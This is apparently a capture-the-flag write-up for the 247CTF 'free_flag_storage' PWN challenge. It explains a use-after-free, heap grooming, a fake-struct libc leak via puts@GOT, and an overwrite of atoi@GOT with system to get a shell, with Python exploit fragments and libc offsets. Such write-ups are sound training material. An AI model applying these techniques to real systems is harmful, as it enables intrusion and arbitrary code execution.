# free_flag_storage - 247CTF PWN Challenge

## Challenge Info
- **Name**: free_flag_storage
- **Category**: PWN
- **Remote**: `tcp://de22d451a7a11cba.247ctf.com:50413`
- **Description**: "We created a custom application to store challenge flags. Can you abuse the implementation to access the flag stored on the application server?"

## Flag
```
247CTF{a3fa2XXXXXXXXXXXXXXXXa0130fa3aec}
```

---

## Binary Analysis

### Protections
```
Arch:       i386-32-little
RELRO:      Partial RELRO    <- GOT is writable!
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000) <- Fixed addresses
```

### Struct Layout
The program manages "flags" with the following structure (16 bytes):
```c
struct flag {
    uint32_t length;      // offset 0x00
    char*    value_ptr;   // offset 0x04  <- pointer to value buffer
    uint32_t challenge_id;// offset 0x08
    uint32_t score;       // offset 0x0c
};
```

### Key Addresses
```
flags array:  0x804b04c  (max 3 flags)
puts@GOT:     0x804b028
atoi@GOT:     0x804b034
```

### Commands
- `add` - Creates a new flag (malloc struct + malloc value)
- `edit` - Edits an existing flag (writes to value_ptr)
- `delete` - Deletes a flag (free value, free struct)
- `print` - Shows all flags

---

## Vulnerability: Use-After-Free

The `delete()` function frees memory but does **NOT set the pointer to NULL**:

```c
void delete(int idx) {
    free(flags[idx]->value);   // Free value buffer
    free(flags[idx]);          // Free struct
    // BUG: flags[idx] NOT set to NULL!
    count--;
}
```

This allows:
1. Access freed memory through the dangling pointer
2. Create overlaps between different allocations

---

## Exploit Strategy

### 1. Heap Feng Shui

**Goal**: Make the `value` buffer of a new flag be allocated in the location of a previous `struct`.

```
Step 1: Create 3 flags with 8-byte values
- flag0: struct0 (24-byte chunk), value0 (16-byte chunk)
- flag1: struct1 (24-byte chunk), value1 (16-byte chunk)
- flag2: struct2 (24-byte chunk), value2 (16-byte chunk)

Step 2: Delete flag0 and flag1
- fastbin-24: struct1 -> struct0
- fastbin-16: value1 -> value0
- flags[0] and flags[1] are dangling pointers!

Step 3: Add new flag with 16-byte value (= 24-byte chunk)
- malloc(struct) = struct1 (from fastbin-24)
- malloc(value)  = struct0 (from fastbin-24!)
- Now: value3 is at the location of struct0
- And flags[0] still points to struct0 = value3!
```

### 2. Leak libc

We write a **fake struct** as the value of the new flag:
```python
fake_struct = p32(5) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
#             length   value_ptr      cid           score
```

When `print` reads `flags[0]`:
- It reads our fake struct (because flags[0] -> struct0 = value3)
- `value_ptr = puts@GOT`
- Prints the contents of puts@GOT = address of puts in libc

### 3. GOT Overwrite

We update the fake struct to point to `atoi@GOT`:
```python
edit(1, p32(5) + p32(atoi_got) + p32(0xdead) + p32(0xbeef), 16)
```

Then `edit(0)` writes to `atoi@GOT`:
```python
p.send(p32(system_addr) + b'X')  # 5 bytes
```

### 4. Shell

After the overwrite, `atoi@GOT = system`. When the program asks for the new `challenge_id`:
```python
p.sendline(b'sh')  # atoi("sh") = system("sh") -> SHELL!
```

---

## The Critical Bug: NULL Byte Corruption

### The Problem

During debugging, the exploit was failing with:
```
SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xdc5430}
```

The address `0xdc5430` is only 3 bytes of `0xf7dc5430` - the MSB was missing!

### Root Cause

In the disassembly of `edit()`:
```asm
8048b22:  mov    -0x14(%ebp),%edx    ; bytes_read
8048b25:  sub    $0x1,%edx           ; bytes_read - 1
8048b28:  add    %edx,%eax           ; value_ptr + bytes_read - 1
8048b2a:  movb   $0x0,(%eax)         ; WRITE NULL BYTE!
```

The program writes a **NULL byte at the end of the value** to null-terminate the string:
```
position = value_ptr + bytes_read - 1
*position = 0x00
```

With `length=4` and `value_ptr=atoi@GOT`:
- Reads 4 bytes of system address
- Writes NULL at `atoi@GOT + 4 - 1 = atoi@GOT + 3`
- **Corrupts the MSB of our address!**

`0xf7dc5430` → `0x00dc5430` → SIGSEGV

### The Solution

Use `length=5` instead of `length=4`:
```python
fake_struct = p32(5) + p32(atoi_got) + ...
#                 ↑ 5 bytes!
```

Now:
- Reads 5 bytes (4 from system + 1 dummy)
- Writes NULL at `atoi@GOT + 5 - 1 = atoi@GOT + 4`
- The NULL goes **after** the 4 important bytes
- `atoi@GOT` keeps `0xf7dc5430` intact!

---

## Libc Offsets

### Local (testing)
```
/lib/i386-linux-gnu/libc.so.6
puts:   0x78140
system: 0x50430
```

### Remote (Ubuntu 18.04 i386)
```
puts:   0x67360
system: 0x3cd10
```

---

## Flag Captured

![Flag Screenshot](freeflag.png)

---

## Exploit Files

- `free_flag_storage_solve.py` - Final working exploit
- `free_flag_storage` - Challenge binary

## Usage

```bash
# Local test
python3 free_flag_storage_solve.py

# Remote exploit
python3 free_flag_storage_solve.py REMOTE
```

---

## Debug Timeline

1. [OK] Confirmed UAF: after delete+add, both flags show the same content
2. [OK] Leak works: we read puts@libc correctly
3. [OK] Fake struct works: cid=0xdead confirms our struct is being read
4. [FAIL] Shell was not spawning: SIGSEGV with truncated address
5. [DEBUG] strace revealed: `read(0, "0T\334\367", 4) = 4` - correct read
6. [DEBUG] But SIGSEGV at `0xdc5430` - only 3 bytes
7. [INFO] Disasm revealed: `movb $0x0,(%eax)` writes NULL at the end
8. [OK] Fix: length=5 avoids MSB corruption
9. [DONE] Shell works!

---

## Lessons Learned

1. **Classic UAF**: delete without NULL allows access to freed memory
2. **Heap feng shui**: Controlling which memory gets reused
3. **Arbitrary read/write**: Fake struct with controlled value_ptr
4. **GOT overwrite**: Partial RELRO allows overwriting GOT
5. **Off-by-one NULL**: Always consider null-termination in exploits
